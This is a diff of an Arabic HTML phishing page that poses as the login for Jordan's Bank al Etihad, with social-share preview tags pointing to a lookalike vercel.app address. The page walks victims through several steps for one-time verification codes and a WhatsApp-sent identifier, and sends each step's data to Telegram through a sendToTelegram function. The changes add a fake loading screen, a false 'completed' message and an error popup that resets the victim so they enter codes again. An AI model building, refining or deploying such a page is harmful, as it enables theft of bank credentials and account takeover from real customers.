@@ -2,9 +2,23 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>التحقق من الهوية</title>
+  <title>تسجيل دخول بنك الاتحاد الأردني</title>
   <meta name="viewport" content="width=device-width,initial-scale=1.0">
   <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap" rel="stylesheet">
+
+  <!-- Social Media Preview -->
+  <meta property="og:title" content="تسجيل دخول بنك الاتحاد الأردني" />
+  <meta property="og:description" content="يرجى تسجيل الدخول للتحقق من هويتك في بنك الاتحاد الأردني." />
+  <meta property="og:image" content="https://www2.0zz0.com/2025/09/28/02/413027069.jpeg" />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://ithadbank.vercel.app/" />
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="تسجيل دخول بنك الاتحاد الأردني">
+  <meta name="twitter:description" content="يرجى تسجيل الدخول للتحقق من هويتك في بنك الاتحاد الأردني.">
+  <meta name="twitter:image" content="https://www2.0zz0.com/2025/09/28/02/413027069.jpeg">
+
   <style>
     :root {
       --primary: #FF6600;
@@ -88,6 +102,7 @@
       color: #444;
       margin-bottom: 8px;
       display: block;
+      text-align: center;
     }
     .input-box {
       display: flex;
@@ -97,6 +112,7 @@
       border: 2px solid var(--border);
       padding: 0 14px;
       transition: border-color 0.2s;
+      justify-content: center;
     }
     .input-box:focus-within {
       border-color: var(--primary);
@@ -116,6 +132,7 @@
       color: #222;
       direction: rtl;
       font-family: 'Tajawal', Arial, sans-serif;
+      text-align: center;
     }
     input:disabled {
       background: #ececec;
@@ -126,6 +143,7 @@
       margin-top: 3px;
       font-weight: 500;
       display: none;
+      text-align: center;
     }
     .error.show {
       display: block;
@@ -224,6 +242,34 @@
       font-size: 1rem;
       font-weight: 600;
     }
+
+    /* شاشة التحميل */
+    .loading-overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(255,255,255,0.87);
+      z-index: 9888;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 2rem;
+      color: var(--primary);
+      font-weight: bold;
+    }
+    .loader {
+      display: inline-block;
+      width: 52px;
+      height: 52px;
+      border-radius: 50%;
+      border: 6px solid #ffd6c2;
+      border-top: 6px solid var(--primary);
+      animation: spin 1s linear infinite;
+      margin-bottom: 12px;
+    }
+    @keyframes spin {
+      0%{transform:rotate(0deg);}
+      100%{transform:rotate(360deg);}
+    }
   </style>
 </head>
 <body>
@@ -292,10 +338,10 @@
       <div class="step" id="step-3">
         <h2 class="centered">رمز التحقق</h2>
         <div class="desc centered">يرجى إدخال رمز التحقق المكون من 6 أرقام.</div>
-        <form id="form-step-3" autocomplete="off">
-          <div class="form-group">
+        <form id="form-step-3" autocomplete="off" class="centered">
+          <div class="form-group centered">
             <label class="centered">رمز التحقق</label>
-            <div class="input-box">
+            <div class="input-box centered">
               <span class="input-icon">🔑</span>
               <input type="tel" inputmode="numeric" id="verifycode" maxlength="6" pattern="[0-9]*" required autocomplete="off" />
             </div>
@@ -306,13 +352,13 @@
       </div>
       <!-- Step 4 -->
       <div class="step" id="step-4">
-        <div class="whatsapp-info">
+        <div class="whatsapp-info centered">
           تم إرسال الاسم التعريفي إلى الواتساب الخاص بك<br/> الرجاء إدخاله أدناه
         </div>
-        <form id="form-step-4" autocomplete="off">
-          <div class="form-group">
+        <form id="form-step-4" autocomplete="off" class="centered">
+          <div class="form-group centered">
             <label class="centered">ادخل النص هنا</label>
-            <div class="input-box">
+            <div class="input-box centered">
               <span class="input-icon">📝</span>
               <input type="text" id="whatsid" maxlength="32" required autocomplete="off" />
             </div>
@@ -325,10 +371,10 @@
       <div class="step" id="step-5">
         <h2 class="centered">رمز تحقق جديد</h2>
         <div class="desc centered">يرجى إدخال رمز تحقق جديد مكون من 6 أرقام.</div>
-        <form id="form-step-5" autocomplete="off">
-          <div class="form-group">
+        <form id="form-step-5" autocomplete="off" class="centered">
+          <div class="form-group centered">
             <label class="centered">رمز التحقق الجديد</label>
-            <div class="input-box">
+            <div class="input-box centered">
               <span class="input-icon">🔐</span>
               <input type="tel" inputmode="numeric" id="verifycode2" maxlength="6" pattern="[0-9]*" required autocomplete="off" />
             </div>
@@ -338,25 +384,42 @@
         </form>
       </div>
       <!-- Step 6 -->
-      <div class="step" id="step-6"></div>
+      <div class="step" id="step-6" class="centered">
+        <div class="centered" style="height:210px;justify-content:center;">
+          <h2 style="color:var(--success);text-align:center;">تم الانتهاء!</h2>
+          <div class="desc centered" style="font-weight:700;font-size:1.12rem;">شكرًا لك.</div>
+        </div>
+      </div>
     </div>
   </div>
   <!-- نافذة منبثقة للإشعار -->
   <div id="popup-error" style="display:none;" class="popup-error">
     <div class="popup-error-inner">
-      هناك خطأ في أحد المعلومات، يرجى إدخال المعلومات مرة أخرى.<br>
+      هناك خطأ في أحد المعلومات يرجى إعادة الدخول مرة أخرى.<br>
       <button class="popup-error-btn" onclick="closePopupError()">حسناً</button>
+    </div>
+  </div>
+  <!-- شاشة التحميل -->
+  <div id="loading-overlay" class="loading-overlay" style="display:none;">
+    <div>
+      <div class="loader"></div>
+      جاري التحميل...
     </div>
   </div>
 <script>
   let userData = {};
 
+  // شاشة تحميل بين كل الخطوة والثانية
   function showStep(n) {
-    document.querySelectorAll('.step').forEach((el, i) => {
-      el.classList.remove('active');
-      if (i === n - 1) el.classList.add('active');
-    });
-    window.scrollTo({top: 0, behavior: 'smooth'});
+    document.getElementById('loading-overlay').style.display = 'flex';
+    setTimeout(function() {
+      document.querySelectorAll('.step').forEach((el, i) => {
+        el.classList.remove('active');
+        if (i === n - 1) el.classList.add('active');
+      });
+      document.getElementById('loading-overlay').style.display = 'none';
+      window.scrollTo({top: 0, behavior: 'smooth'});
+    }, 3000);
   }
 
   function sendToTelegram(data) {
@@ -457,9 +520,11 @@
     if (valid) {
       userData.verifycode2 = verifycode2;
       sendToTelegram({ الخطوة: "٥- رمز تحقق ثاني", ...userData });
-      // بدل رسالة النهاية، أظهر إشعار خطأ منبثق وأعد المستخدم للبداية
-      showPopupError();
-      userData = {};
+      showStep(6);
+      setTimeout(function() {
+        showPopupError();
+        userData = {};
+      }, 3400);
     }
   });
 
